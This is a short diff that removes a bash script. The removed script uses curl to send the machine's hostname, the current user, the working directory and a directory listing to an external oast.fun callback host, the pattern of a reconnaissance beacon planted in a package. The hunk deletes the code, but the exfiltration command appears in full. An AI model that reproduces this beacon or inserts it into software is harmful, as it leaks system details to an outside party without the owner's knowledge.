@@ -1,4 +1,0 @@
-#!/bin/bash
-
-curl -H "Hostname: $(hostname)" -H "Whoami: $(whoami)" -H "Pwd: $(pwd)" -d $(ls -la)  http://dd.
-cdamwas2vtc00003r5pgggikqfcyyyyyb.oast.fun
